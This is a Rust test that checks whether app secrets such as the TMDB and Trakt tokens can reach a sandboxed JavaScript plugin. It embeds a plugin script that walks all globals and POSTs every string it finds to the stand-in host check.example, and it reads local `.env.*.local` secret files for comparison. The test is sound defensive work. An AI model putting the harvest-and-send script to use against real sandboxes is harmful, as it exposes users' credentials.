//! No app secret reaches a plugin (lead, 2026-10-28): nothing the engine
//! exposes (globals, `require`'s modules, `fetch` defaults) carries the
//! TMDB read token, Trakt client values, relay or account tokens. Its own
//! binary: the test puts a sentinel in the process environment.

use mq_plugins::engine::{
    Call, FetchRequest, FetchResponse, HostCall, HostReply, HostRequest, Info, Limits, Media,
    Method, Outcome, call,
};
use std::path::Path;
use std::sync::Arc;
use std::time::Duration;
use tokio::sync::mpsc;

const SENTINEL: &str = "mq-sentinel-7d1f0c2e9b";

/// Every `.env.*.local` value beside the workspace (the app's real secrets
/// on a machine that builds release cores) and in `~/opt/momotus/secrets`,
/// each named by its file and variable.
fn local_secrets() -> Vec<(String, String)> {
    let mut dirs: Vec<std::path::PathBuf> = Path::new(env!("CARGO_MANIFEST_DIR"))
        .ancestors()
        .map(Path::to_path_buf)
        .collect();
    if let Some(home) = std::env::var_os("HOME") {
        dirs.push(Path::new(&home).join("opt/momotus/secrets"));
    }
    let mut out = Vec::new();
    for dir in dirs {
        let Ok(entries) = std::fs::read_dir(&dir) else {
            continue;
        };
        for entry in entries.flatten() {
            let name = entry.file_name().to_string_lossy().into_owned();
            if !(name.starts_with(".env.") && name.ends_with(".local")) {
                continue;
            }
            let text = std::fs::read_to_string(entry.path()).unwrap_or_default();
            for line in text.lines() {
                if let Some((key, value)) = line.split_once('=') {
                    let key = key.trim().trim_start_matches("export ").trim();
                    let value = value.trim().trim_matches(['"', '\'']).to_owned();
                    out.push((format!("{}: {key}", entry.path().display()), value));
                }
            }
        }
    }
    out
}

#[test]
fn no_app_secret_reaches_a_plugin() {
    // SAFETY: the only test in this binary, before any thread starts.
    unsafe { std::env::set_var("MARQUEE_TMDB_READ_TOKEN_TEST", SENTINEL) };
    // (where it comes from, the value); a failure names the first, never
    // the second, so a failing run cannot leak a token into a log.
    let mut secrets: Vec<(String, String)> = [
        (
            "MARQUEE_TMDB_READ_TOKEN",
            option_env!("MARQUEE_TMDB_READ_TOKEN"),
        ),
        ("MARQUEE_TMDB_API_KEY", option_env!("MARQUEE_TMDB_API_KEY")),
        (
            "MARQUEE_TRAKT_CLIENT_ID",
            option_env!("MARQUEE_TRAKT_CLIENT_ID"),
        ),
        ("MARQUEE_LINK_HOST", option_env!("MARQUEE_LINK_HOST")),
        ("MARQUEE_SYNC_SERVER", option_env!("MARQUEE_SYNC_SERVER")),
    ]
    .into_iter()
    .filter_map(|(k, v)| Some((format!("compile-time {k}"), v?.to_owned())))
    .collect();
    secrets.extend(
        std::env::vars()
            .filter(|(k, _)| k.starts_with("MARQUEE_"))
            .map(|(k, v)| (format!("environment {k}"), v)),
    );
    secrets.extend(local_secrets());
    secrets.retain(|(_, v)| v.len() >= 8);
    assert!(secrets.iter().any(|(_, v)| v == SENTINEL));
    let body = r#"
        const seen = new Set();
        const found = [];
        const queue = [globalThis, require("cheerio"), require("crypto-js"), require("cheerio").load("<p>x</p>")];
        while (queue.length && seen.size < 50000) {
            const o = queue.shift();
            if (o === null || (typeof o !== "object" && typeof o !== "function") || seen.has(o)) continue;
            seen.add(o);
            for (const k of Reflect.ownKeys(o)) {
                if (typeof k === "string") found.push(k);
                else found.push(String(k.description));
                let v;
                try {
                    const d = Object.getOwnPropertyDescriptor(o, k);
                    v = "value" in d ? d.value : d.get ? d.get.call(o) : undefined;
                } catch { continue; }
                if (typeof v === "string") found.push(v);
                else if (v !== null && (typeof v === "object" || typeof v === "function")) queue.push(v);
            }
            const p = Object.getPrototypeOf(o);
            if (p) queue.push(p);
        }
        const text = found.join("\n");
        for (let at = 0; at < text.length; at += 200000)
            await fetch("https://check.example/", { method: "POST", body: text.slice(at, at + 200000) });
        await fetch("https://check.example/plain");
        return say([typeof process, typeof Deno, typeof Bun, TMDB_API_KEY, seen.size]);
    "#;
    let script = format!(
        "const say = (v) => [{{ url: 'u', name: JSON.stringify(v) }}];\n\
         async function getStreams() {{\n{body}\n}}\nmodule.exports = {{ getStreams }};"
    );
    let (tx, mut rx) = mpsc::unbounded_channel::<HostRequest>();
    let host = std::thread::spawn(move || {
        let mut fetches: Vec<FetchRequest> = Vec::new();
        while let Some(HostRequest { call, reply }) = rx.blocking_recv() {
            if let HostCall::Fetch(request) = call {
                let _ = reply.send(HostReply::Response(FetchResponse {
                    status: 200,
                    status_text: "OK".into(),
                    url: request.url.clone(),
                    headers: Vec::new(),
                    body: Vec::new(),
                }));
                fetches.push(request);
            }
        }
        fetches
    });
    let call_ = Call {
        script,
        plugin_id: "test".into(),
        tmdb_id: "603".into(),
        media: Media::Movie,
        season: None,
        episode: None,
        info: Info::default(),
    };
    let limits = Limits {
        cpu: Duration::from_secs(2),
        wall: Duration::from_secs(10),
        ..Limits::default()
    };
    let out = call(call_, limits, Arc::default(), tx)
        .unwrap()
        .join()
        .unwrap();
    let fetches = host.join().unwrap();
    let Outcome::Done(streams) = &out else {
        panic!("{out:?}")
    };
    let answer: serde_json::Value =
        serde_json::from_str(streams[0].name.as_deref().unwrap()).unwrap();
    assert_eq!(
        answer[0..4],
        serde_json::json!(["undefined", "undefined", "undefined", ""])
            .as_array()
            .unwrap()[..]
    );
    assert!(answer[4].as_u64().unwrap() > 100, "{answer}");
    let posted: String = fetches
        .iter()
        .filter_map(|r| r.body.as_ref())
        .map(|b| String::from_utf8_lossy(b).into_owned())
        .collect();
    assert!(
        posted.contains("getRandomValues") && posted.contains("SCRAPER_ID"),
        "the walk saw the globals"
    );
    let visible: Vec<&str> = secrets
        .iter()
        .filter(|(_, v)| posted.contains(v.as_str()))
        .map(|(name, _)| name.as_str())
        .collect();
    assert!(visible.is_empty(), "visible to a plugin: {visible:?}");
    let plain = fetches.last().unwrap();
    assert_eq!(
        (plain.method, plain.headers.len(), plain.body.is_none()),
        (Method::Get, 0, true)
    );
}
